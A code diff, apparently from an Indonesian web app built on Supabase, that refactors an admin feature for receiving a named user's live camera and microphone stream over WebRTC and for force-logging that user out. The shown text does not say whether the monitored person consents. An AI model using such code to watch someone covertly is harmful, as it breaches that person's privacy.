-    } else {
-      offer = parsed; // format lama
-    }
-    console.log('[Monitor] Offer diterima | hasVideo:', hasVideo, '| hasAudio:', hasAudio);
-  } catch (e) {
-    console.error('[Monitor] Parse offer error:', e);
-    return;
-  }
+    if (parsed.offer) { offer = parsed.offer; hasVideo = parsed.hasVideo !== undefined ? parsed.hasVideo : true; hasAudio = parsed.hasAudio !== undefined ? parsed.hasAudio : true; }
+    else offer = parsed;
+  } catch (e) { return; }
 
   await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
-
   const answer = await peerConnection.createAnswer();
   await peerConnection.setLocalDescription(answer);
-
-  await sendSignal({
-    type:    'answer',
-    from:    ADMIN_NAME,
-    to:      USER_NAME,
-    payload: JSON.stringify({ answer })
-  });
-
-  console.log('[Monitor] Answer dikirim ke Ndifaa');
+  await sendSignal({ type:'answer', from:ADMIN_NAME, to:USER_NAME, payload:JSON.stringify({ answer }) });
 }
 
 function stopAdminStream() {
   if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }
-  streamActive = false;
-  isVideoOn    = false;
-  isAudioOn    = false;
-
+  streamActive = false; isVideoOn = false; isAudioOn = false;
+  closeMonitorFullscreen();
+  hideMonitorFloating();
   const videoBtn = document.getElementById('monitorVideoBtn');
   const audioBtn = document.getElementById('monitorAudioBtn');
   if (videoBtn) { videoBtn.innerHTML = '📵'; videoBtn.style.color = ''; }
   if (audioBtn) { audioBtn.innerHTML = '🔇'; audioBtn.style.color = ''; }
-
-  const view = document.getElementById('monitorView');
-  if (view) view.style.display = 'none';
-
   const vid = document.getElementById('monitorVideo');
   if (vid) { try { vid.srcObject = null; } catch (e) {} }
-}
-
-function hideMonitorView() {
-  const view = document.getElementById('monitorView');
-  if (view) view.style.display = 'none';
+  toast('Monitoring dimatikan');
 }
 
 // ================================================================
@@ -444,45 +620,22 @@ function hideMonitorView() {
 // ================================================================
 
 async function forceLogoutUser() {
-  const ok = await showConfirm('Logout Ndifaa dari semua device?', {
-    icon: '⏏', title: 'Force Logout', okText: 'Logout', cancelText: 'Batal'
-  });
+  const ok = await showConfirm('Logout Ndifaa dari semua device?', { icon:'⏏', title:'Force Logout', okText:'Logout', cancelText:'Batal' });
   if (!ok) return;
   try {
-    await sb.rpc('force_logout_user', { p_username: USER_NAME });
+    await sb.from('user_sessions').delete().eq('username', USER_NAME);
+    await sb.from('webrtc_signals').insert([{ type:'force_logout', from_user:ADMIN_NAME, to_user:USER_NAME, payload:'{}' }]);
     toast('Ndifaa berhasil di-logout');
-  } catch (err) {
-    // Fallback: insert langsung
-    try {
-      await sb.from('webrtc_signals').insert([{
-        type: 'force_logout', from_user: ADMIN_NAME, to_user: USER_NAME, payload: '{}'
-      }]);
-      await sb.from('user_sessions').delete().eq('username', USER_NAME);
-      toast('Ndifaa berhasil di-logout');
-    } catch (e) {
-      toast('Gagal logout', false);
-    }
-  }
+  } catch (e) { toast('Gagal logout', false); }
 }
 
 function listenForceLogout() {
   if (!currentAccount || currentAccount.name !== USER_NAME) return;
-
-  sb.channel('force_logout_watch_' + Date.now())
-    .on('postgres_changes', {
-      event:  'INSERT',
-      schema: 'public',
-      table:  'webrtc_signals',
-      filter: 'to_user=eq.' + USER_NAME
-    }, (payload) => {
-      if (!payload.new) return;
-      if (payload.new.type === 'force_logout') {
-        toast('Session diakhiri oleh admin');
-        setTimeout(() => {
-          sessionStorage.clear();
-          window.location.href = 'index.html';
-        }, 1500);
-      }
+  sb.channel('force_logout_' + Date.now())
+    .on('postgres_changes', { event:'INSERT', schema:'public', table:'webrtc_signals', filter:'to_user=eq.'+USER_NAME }, (payload) => {
+      if (!payload.new || payload.new.type !== 'force_logout') return;
+      toast('Session diakhiri oleh admin');
+      setTimeout(() => { sessionStorage.clear(); window.location.href = 'index.html'; }, 1500);
     })
     .subscribe();
 }
@@ -492,29 +645,15 @@ function listenForceLogout() {
 // ================================================================
 
 async function sendSignal({ type, from, to, payload }) {
-  try {
-    await sb.from('webrtc_signals').insert([{
-      type, from_user: from, to_user: to, payload: payload || '{}'
-    }]);
-  } catch (err) {
-    console.error('[Monitor] sendSignal error:', err);
-  }
+  try { await sb.from('webrtc_signals').insert([{ type, from_user:from, to_user:to, payload:payload||'{}' }]); }
+  catch (err) { console.error('[Monitor] sendSignal error:', err); }
 }
 
 function listenSignals(forUser, callback) {
   if (monitorChannel) { try { sb.removeChannel(monitorChannel); } catch (e) {} }
-
   monitorChannel = sb.channel('monitor_' + forUser + '_' + Date.now())
-    .on('postgres_changes', {
-      event:  'INSERT',
-      schema: 'public',
-      table:  'webrtc_signals',
-      filter: 'to_user=eq.' + forUser
-    }, (payload) => {
-      if (!payload.new) return;
-      // Abaikan sinyal force_logout di sini (sudah handle di listenForceLogout)
-      if (payload.new.type === 'force_logout') return;
-      console.log('[Monitor] Sinyal diterima:', payload.new.type);
+    .on('postgres_changes', { event:'INSERT', schema:'public', table:'webrtc_signals', filter:'to_user=eq.'+forUser }, (payload) => {
+      if (!payload.new || payload.new.type === 'force_logout') return;
       callback(payload.new);
     })
     .subscribe();
@@ -522,31 +661,13 @@ function listenSignals(forUser, callback) {
 
 async function handleRemoteIce(icePayload) {
   if (!peerConnection) return;
-  try {
-    const candidate = JSON.parse(icePayload);
-    await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
-  } catch (e) {
-    console.warn('[Monitor] addIceCandidate error:', e.message);
-  }
+  try { await peerConnection.addIceCandidate(new RTCIceCandidate(JSON.parse(icePayload))); }
+  catch (e) {}
 }
 
 function showMonitorNotice(msg) {
-  console.warn('[Monitor]', msg);
   const t = document.getElementById('toast');
   if (!t) return;
-  t.textContent = msg;
-  t.className = 'toast show err';
+  t.textContent = msg; t.className = 'toast show err';
   setTimeout(() => { t.className = 'toast'; }, 6000);
 }
-
-// ================================================================
-// AUTO INIT
-// ================================================================
-document.addEventListener('DOMContentLoaded', () => {
-  setTimeout(() => {
-    if (typeof initMonitor === 'function' && typeof currentAccount !== 'undefined' && currentAccount) {
-      // Sudah di-handle dari checkMonitorPerm di dashboard.js
-      // initMonitor dipanggil dari sana
-    }
-  }, 500);
-});
